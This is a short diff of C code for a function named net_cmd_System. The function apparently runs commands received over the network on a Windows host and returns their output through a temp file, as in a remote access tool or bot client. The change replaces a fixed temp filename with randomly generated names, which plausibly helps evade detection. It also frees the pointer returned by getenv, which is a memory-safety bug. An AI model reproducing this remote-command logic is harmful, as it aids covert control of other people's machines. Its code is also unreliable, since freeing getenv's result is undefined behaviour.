@@ -9,9 +9,12 @@
 int net_cmd_System(char* msg, int msgLen)
 {
 	char* temp_path = getenv("TEMP");
-	int len = strlen(temp_path) + 16;
+	char* rand_name = main_nameGenerator(temp_path);
+	int len = strlen(rand_name) + 1;
 	char* buff_path = malloc(len);
-	snprintf(buff_path, len, "%s\\mKtIXMj52rh7PU", temp_path);
+	snprintf(buff_path, len, "%s", rand_name);
+	free(temp_path);
+	free(rand_name);
 
 	PROCESS_INFORMATION pi; 
 	STARTUPINFO si;
@@ -57,7 +60,6 @@ int net_cmd_System(char* msg, int msgLen)
 				fclose(f);
 				remove(buff_path);
 				free(buff_path);
-				free(temp_path);
 	
 				return -1;
 			}
@@ -75,7 +77,6 @@ int net_cmd_System(char* msg, int msgLen)
 
 	remove(buff_path);
 	free(buff_path);
-	free(temp_path);
 
 	buff[0] = NET_CMD_SYSTEM;
 	
